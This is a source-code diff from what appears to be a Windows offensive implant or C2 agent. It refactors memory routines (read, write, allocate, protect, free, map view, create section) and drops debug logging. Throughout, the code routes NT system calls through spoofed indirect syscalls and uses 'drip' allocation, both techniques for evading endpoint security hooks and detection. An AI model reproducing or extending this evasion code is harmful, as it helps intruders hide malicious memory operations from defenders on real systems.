@@ -10,20 +10,14 @@ auto DECLFN Memory::Read(
     const UINT32 Flags = Self->Config.Syscall;
     NTSTATUS    Status = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE ) {
+    if ( ! Flags ) {
         return NT_SUCCESS( Self->Ntdll.NtReadVirtualMemory(
             Handle, Base, Buffer, Size, (PULONG)Reads
         ));
     }
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Read].Instruction
-        : (UPTR)Self->Ntdll.NtReadVirtualMemory;
-
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Read].ssn
-        : 0;
-
+    UPTR Address = SYS_ADDR( Sys::Read );
+    UPTR ssn = SYS_SSN( Sys::Read );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)Handle, (UPTR)Base,
@@ -57,13 +51,8 @@ auto DECLFN Memory::Alloc(
         }
     }
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Alloc].Instruction
-        : (UPTR)Self->Ntdll.NtAllocateVirtualMemory;
-
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Alloc].ssn
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::Alloc );
+    UPTR ssn = SYS_SSN( Sys::Alloc );
 
     KhDbg("executing indirect syscall with spoof");
     Status = Self->Spf->Call(
@@ -91,14 +80,10 @@ auto DECLFN Memory::DripAlloc(
     PVOID  CurrentBase = BaseAddress;
     PVOID* AddressList = (PVOID*)hAlloc( GranCount );
 
-    KhDbg("valid gran memory: %p\n", BaseAddress);
-
     for ( INT i = 0; i < GranCount; i++ ) {
         CurrentBase = Self->Mm->Alloc( 
             CurrentBase, PageGran, MEM_RESERVE, PAGE_NOACCESS, Handle
         );
-
-        KhDbg("reserved current[%d] = %p\n", i, CurrentBase);
 
         AddressList[i] = CurrentBase;
         CurrentBase    = (PVOID)( (UPTR)CurrentBase + PageGran );
@@ -111,12 +96,8 @@ auto DECLFN Memory::DripAlloc(
             CurrentBase = Self->Mm->Alloc( 
                 CurrentBase, PageSize, MEM_COMMIT, Protect, Handle 
             );
-
-            KhDbg("commit current[%d] = %p\n", z, CurrentBase);
         }
     }
-
-    KhDbg("base %p\n", BaseAddress);
 
     return BaseAddress;
 }
@@ -131,7 +112,6 @@ auto DECLFN Memory::Protect(
     const UINT32 Flags  = Self->Config.Syscall;
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
-
     if ( Flags == SYSCALL_NONE ) {
         if ( Handle == NtCurrentProcess() ) {
             return Self->Krnl32.VirtualProtect( Base, Size, NewProt, OldProt );
@@ -140,13 +120,8 @@ auto DECLFN Memory::Protect(
         }
     }
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Protect].Instruction
-        : (UPTR)Self->Ntdll.NtProtectVirtualMemory;
-
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Protect].ssn
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::Protect );
+    UPTR ssn = SYS_SSN( Sys::Protect );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)Handle, (UPTR)&Base,
@@ -253,20 +228,14 @@ auto DECLFN Memory::Write(
     const UINT32 Flags   = Self->Config.Syscall;
     NTSTATUS     Status  = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE ) {
+    if ( ! Flags ) {
         return NT_SUCCESS( Self->Ntdll.NtWriteVirtualMemory(
             Handle, Base, Buffer, Size, Written
         ));
     }
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Write].Instruction
-        : (UPTR)Self->Ntdll.NtWriteVirtualMemory;
-
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Write].ssn
-        : 0;
-
+    UPTR Address = SYS_ADDR( Sys::Write );
+    UPTR ssn = SYS_SSN( Sys::Write );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)Handle, (UPTR)Base,
@@ -288,20 +257,15 @@ auto DECLFN Memory::Free(
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
     if ( ! Handle ) {
-        if ( Flags == SYSCALL_NONE ) {
+        if ( ! Flags ) {
             return NT_SUCCESS( Self->Ntdll.NtFreeVirtualMemory(
                 Handle, &Base, &Size, FreeType
             ));
         }
     }
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Free].Instruction
-        : (UPTR)Self->Ntdll.NtFreeVirtualMemory;
-
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::Free].ssn
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::Free );
+    UPTR ssn = SYS_SSN( Sys::Free );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)Handle, (UPTR)&Base, (UPTR)&Size, (UPTR)FreeType
@@ -327,7 +291,7 @@ auto DECLFN Memory::MapView(
     const UINT32 Flags = Self->Config.Syscall;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE ) {
+    if ( ! Flags ) {
         return Self->Ntdll.NtMapViewOfSection(
             SectionHandle, ProcessHandle, BaseAddress, ZeroBits,
             CommitSize, SectionOffset, ViewSize, InheritDisposition,
@@ -335,13 +299,8 @@ auto DECLFN Memory::MapView(
         );
     }
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::MapView].Instruction
-        : (UPTR)Self->Ntdll.NtMapViewOfSection;
-
-    UPTR ssn = (Flags == SYSCALL_SPOOF_INDIRECT)
-        ? (UPTR)Self->Sys->Ext[Sys::MapView].ssn
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::MapView );
+    UPTR ssn = SYS_SSN( Sys::MapView );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)SectionHandle, (UPTR)ProcessHandle,
@@ -365,7 +324,7 @@ auto DECLFN Memory::CreateSection(
     const UINT32 Flags = Self->Config.Syscall;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE ) {
+    if ( ! Flags ) {
         return Self->Ntdll.NtCreateSection(
             SectionHandle, DesiredAccess, ObjectAttributes,
             MaximumSize, SectionPageProtection, AllocationAttributes,
@@ -373,13 +332,8 @@ auto DECLFN Memory::CreateSection(
         );
     }
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::CrSectn].Instruction
-        : (UPTR)Self->Ntdll.NtCreateSection;
-
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::CrSectn].ssn
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::CrSectn );
+    UPTR ssn = SYS_SSN( Sys::CrSectn );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)SectionHandle, (UPTR)DesiredAccess,
